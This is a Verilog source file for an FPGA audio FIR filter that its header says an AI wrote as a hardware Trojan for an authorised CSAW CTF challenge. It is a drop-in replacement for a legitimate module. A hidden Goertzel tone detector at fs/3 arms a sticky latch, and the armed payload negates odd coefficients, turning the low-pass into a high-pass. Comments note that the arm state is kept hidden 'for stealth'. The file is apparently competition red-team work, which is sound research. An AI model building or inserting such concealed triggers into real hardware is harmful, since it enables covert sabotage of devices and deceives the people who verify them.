// =============================================================================
// fir_audio_top_trojan.v  -  Candidate 05d (DSP) : Trojaned FIR audio filter
//
// AI-AUTHORED hardware Trojan (Claude Opus 4.8) for the authorized CSAW 2026
// Challenge 3 CTF. Drop-in replacement for the recovered golden fir_audio_top:
// SAME module name, SAME ports, SAME I2S framing/timing, SAME serial-MAC
// datapath and round/saturate arithmetic. The ONLY additions are the trigger
// observer and a gated coefficient transform, both inert until armed.
//
//   TRIGGER  (frequency-domain, multiplier-free): a Goertzel single-bin detector
//            at f_key = fs/3 = 5333.33 Hz (exact DFT bin k=192, window N=576).
//            At fs/3 the Goertzel coefficient 2*cos(2*pi/3) = -1 EXACTLY, so the
//            recurrence collapses to  s0 = x - s1 - s2  (adds only, NO multiplier),
//            and the arm metric is the L1 magnitude |s1|+|s2| (abs+add, NO squares).
//            When a non-overlapping window's |s1|+|s2| reaches 2^23 a sticky arm
//            latch sets. Measured: real audio never arms (~35 dB margin); a
//            full-scale fs/3 key tone arms in one 576-sample (36 ms) window. The
//            whole detector is adders -> a few hundred LUTs on iCE40-UP5K.
//   PAYLOAD  (spectral inversion): while armed, the FIR coefficients are
//            multiplied by (-1)^k  (odd-index taps negated) at the MAC input,
//            turning the low-pass into a high-pass (passband gain -> ~-60 dB).
//
// NORMAL-OPERATION EQUIVALENCE: when disarmed (arm_mac==0) the MAC multiplies by
// the unmodified COEF[k], so the delay line, accumulate, rounding, saturation,
// serializer and LEDs are byte-for-byte identical to the golden design. The
// Goertzel block only drives the internal arm latch; it touches no output.
//
// Arm/MAC ordering (matches tests/ref_trojan.py exactly): the MAC for a given
// input sample captures the arm latch value BEFORE that sample's Goertzel
// window update, so an arm set at the end of window w affects samples in the
// NEXT window onward.
// =============================================================================
`default_nettype none

module fir_audio_top (
    input  wire ICE_CLK,     // free-running ~10 MHz system clock
    input  wire I2S_BCLK,    // I2S bit clock (<= 1 MHz), oversampled
    input  wire I2S_WS,      // I2S word select (0=left, 1=right)
    input  wire I2S_SD_IN,   // serial data in (sample to filter, MSB first)
    output reg  I2S_SD_OUT,  // serial data out (left=filtered, right=echo)
    output wire ICE_LED,     // activity: high while the MAC is computing
    output wire RGB_R,       // status LEDs (active-low)
    output wire RGB_G,
    output wire RGB_B
);
    localparam integer NTAP = 63;

    // ----------------------------------------------------------------------
    // Recovered Q1.15 coefficients (symmetric, sum = 32768 = 1.0)  [UNCHANGED]
    // ----------------------------------------------------------------------
    reg signed [15:0] COEF [0:NTAP-1];
    integer ci;
    initial begin
        COEF[0]=-14;   COEF[1]=20;    COEF[2]=27;    COEF[3]=-12;
        COEF[4]=-45;   COEF[5]=-9;    COEF[6]=63;    COEF[7]=49;
        COEF[8]=-66;   COEF[9]=-109;  COEF[10]=34;   COEF[11]=176;
        COEF[12]=49;   COEF[13]=-219; COEF[14]=-187; COEF[15]=198;
        COEF[16]=362;  COEF[17]=-71;  COEF[18]=-524; COEF[19]=-188;
        COEF[20]=600;  COEF[21]=577;  COEF[22]=-497; COEF[23]=-1062;
        COEF[24]=104;  COEF[25]=1575; COEF[26]=752;  COEF[27]=-2030;
        COEF[28]=-2587;COEF[29]=2344; COEF[30]=10114;COEF[31]=13920;
        COEF[32]=10114;COEF[33]=2344; COEF[34]=-2587;COEF[35]=-2030;
        COEF[36]=752;  COEF[37]=1575; COEF[38]=104;  COEF[39]=-1062;
        COEF[40]=-497; COEF[41]=577;  COEF[42]=600;  COEF[43]=-188;
        COEF[44]=-524; COEF[45]=-71;  COEF[46]=362;  COEF[47]=198;
        COEF[48]=-187; COEF[49]=-219; COEF[50]=49;   COEF[51]=176;
        COEF[52]=34;   COEF[53]=-109; COEF[54]=-66;  COEF[55]=49;
        COEF[56]=63;   COEF[57]=-9;   COEF[58]=-45;  COEF[59]=-12;
        COEF[60]=27;   COEF[61]=20;   COEF[62]=-14;
    end

    // ----------------------------------------------------------------------
    // Input synchronizers + edge detection (oversampling the I2S lines) [UNCHANGED]
    // ----------------------------------------------------------------------
    reg bclk_s0, bclk_s1, ws_s0, ws_s1, sd_s0, sd_s1;
    always @(posedge ICE_CLK) begin
        bclk_s0 <= I2S_BCLK; bclk_s1 <= bclk_s0;
        ws_s0   <= I2S_WS;   ws_s1   <= ws_s0;
        sd_s0   <= I2S_SD_IN;sd_s1   <= sd_s0;
    end
    wire bclk_rise = bclk_s0 & ~bclk_s1;
    wire bclk_fall = ~bclk_s0 & bclk_s1;
    wire ws_sync   = ws_s1;
    wire sd_sync   = sd_s1;

    // ----------------------------------------------------------------------
    // RX deserializer: recover the 16-bit left sample, MSB first.  [UNCHANGED]
    // ----------------------------------------------------------------------
    reg [15:0] rx_sh;
    reg        ws_prev_bclk;
    reg [15:0] left_sample;
    reg        new_sample;
    reg        end_frame;

    always @(posedge ICE_CLK) begin
        new_sample <= 1'b0;
        end_frame  <= 1'b0;
        if (bclk_rise) begin
            rx_sh <= {rx_sh[14:0], sd_sync};
            if (ws_sync & ~ws_prev_bclk) begin
                left_sample <= {rx_sh[14:0], sd_sync};
                new_sample  <= 1'b1;
            end
            if (~ws_sync & ws_prev_bclk)
                end_frame <= 1'b1;
            ws_prev_bclk <= ws_sync;
        end
    end

    // ======================================================================
    // TROJAN TRIGGER  -  MULTIPLIER-FREE Goertzel single-bin detector @ fs/3.
    // Runs once per audio sample (new_sample), using spare ICE_CLK cycles.
    // At f_key = fs/3 (bin k=192 in N=576) the Goertzel coefficient is -1, so:
    //   Recurrence:  s0 = x - s1 - s2 ; s2<-s1 ; s1<-s0            (adders only)
    //   Window end (every NWIN samples): L1 = |s1| + |s2| ; arm if >= 2^23.
    // (Bit-identical to tests/ref_trojan.py and ai/analysis/trigger_final_proto.py.)
    // ======================================================================
    localparam integer NWIN         = 576;                    // fs/3 bin k=192 => coeff = -1 exactly
    localparam [31:0]  ARM_THRESHOLD = 32'd8388608;           // 2^23 (L1 magnitude |s1|+|s2|)

    reg signed [31:0] gs1, gs2;       // Goertzel state (|s| <= ~1.6e7 << 2^31)
    reg        [9:0]  gwin;           // window sample counter 0..NWIN-1 (0..575)
    reg               arm_latch;      // sticky payload-arm latch
    reg               arm_mac;        // arm value captured for the in-flight MAC

    reg signed [33:0] g_s0;           // next state  s0 = x - s1 - s2  (value fits 32 bits)
    reg        [33:0] g_l1;           // |s1| + |s2|  (<= ~3.3e7 < 2^26)

    always @(posedge ICE_CLK) begin
        if (new_sample) begin
            g_s0 = $signed(left_sample) - gs1 - gs2;            // coeff = -1 : NO multiply
            if (gwin == NWIN-1) begin
                // window complete: new s1 = g_s0, new s2 = gs1 (old)
                g_l1 = (g_s0[33] ? -g_s0 : g_s0) + (gs1[31] ? -gs1 : gs1);  // |s1| + |s2|
                if (g_l1 >= ARM_THRESHOLD)
                    arm_latch <= 1'b1;                          // sticky
                gs1  <= 32'sd0;
                gs2  <= 32'sd0;
                gwin <= 10'd0;
            end else begin
                gs2  <= gs1;
                gs1  <= g_s0[31:0];
                gwin <= gwin + 10'd1;
            end
        end
    end

    // ----------------------------------------------------------------------
    // Serial multiply-accumulate FIR (direct form), one tap per ICE_CLK cycle.
    // PAYLOAD injection point: coef_mac negates odd-index taps when arm_mac=1.
    // ----------------------------------------------------------------------
    reg signed [15:0] dl [0:NTAP-1];
    reg        [6:0]  k;
    reg        busy;
    reg signed [39:0] acc;
    reg signed [15:0] y_filt;
    reg signed [15:0] echo;
    integer di;

    // spectral-inversion coefficient select (identity when disarmed)
    wire signed [15:0] coef_mac = (arm_mac & k[0]) ? -COEF[k] : COEF[k];

    function signed [15:0] round_sat;      // round half toward +inf then int16 sat [UNCHANGED]
        input signed [39:0] a;
        reg   signed [39:0] r;
        begin
            r = (a + 40'sd16384) >>> 15;
            if (r > 40'sd32767)       round_sat = 16'sd32767;
            else if (r < -40'sd32768) round_sat = -16'sd32768;
            else                      round_sat = r[15:0];
        end
    endfunction

    always @(posedge ICE_CLK) begin
        if (new_sample) begin
            arm_mac <= arm_latch;               // capture arm for THIS sample's MAC (pre window-update)
            for (di = NTAP-1; di > 0; di = di - 1)
                dl[di] <= dl[di-1];
            dl[0] <= $signed(left_sample);
            echo  <= $signed(left_sample);
            acc  <= 40'sd0;
            k    <= 7'd0;
            busy <= 1'b1;
        end else if (busy) begin
            acc <= acc + dl[k] * coef_mac;      // PAYLOAD: coef_mac == COEF[k] when disarmed
            if (k == NTAP-1) begin
                busy <= 1'b0;
            end
            k <= k + 7'd1;
        end
    end

    // latch the filtered result one cycle after the last accumulate  [UNCHANGED]
    reg busy_d;
    always @(posedge ICE_CLK) begin
        busy_d <= busy;
        if (busy_d & ~busy)
            y_filt <= round_sat(acc);
    end
    assign ICE_LED = busy;

    // ----------------------------------------------------------------------
    // TX serializer: {filtered, echo} MSB-first, 2-frame latency.  [UNCHANGED]
    // ----------------------------------------------------------------------
    reg signed [15:0] y_d, echo_d;
    reg [31:0] tx_sh;
    reg        loaded;
    always @(posedge ICE_CLK) begin
        if (end_frame) begin
            tx_sh  <= {y_d, echo_d};
            y_d    <= y_filt;
            echo_d <= echo;
            loaded <= 1'b1;
        end else if (bclk_fall && loaded) begin
            I2S_SD_OUT <= tx_sh[31];
            tx_sh      <= {tx_sh[30:0], 1'b0};
        end
    end

    // Status LEDs (active-low) [UNCHANGED - arm is NOT exposed, for stealth]
    assign RGB_G = ~loaded;
    assign RGB_B = loaded;
    assign RGB_R = 1'b1;

    // Power-up state (iCE40 FFs power up to 0).
    integer pi;
    initial begin
        I2S_SD_OUT = 1'b0; busy = 1'b0; busy_d = 1'b0; loaded = 1'b0;
        new_sample = 1'b0; end_frame = 1'b0; ws_prev_bclk = 1'b0;
        k = 7'd0; acc = 40'sd0; rx_sh = 16'd0; tx_sh = 32'd0;
        left_sample = 16'd0; y_filt = 16'd0; echo = 16'd0;
        y_d = 16'd0; echo_d = 16'd0;
        // Trojan state powers up disarmed/zero (iCE40 FFs reset to 0).
        gs1 = 32'sd0; gs2 = 32'sd0; gwin = 10'd0; arm_latch = 1'b0; arm_mac = 1'b0;
        for (pi = 0; pi < NTAP; pi = pi + 1) dl[pi] = 16'sd0;
    end

endmodule
`default_nettype wire
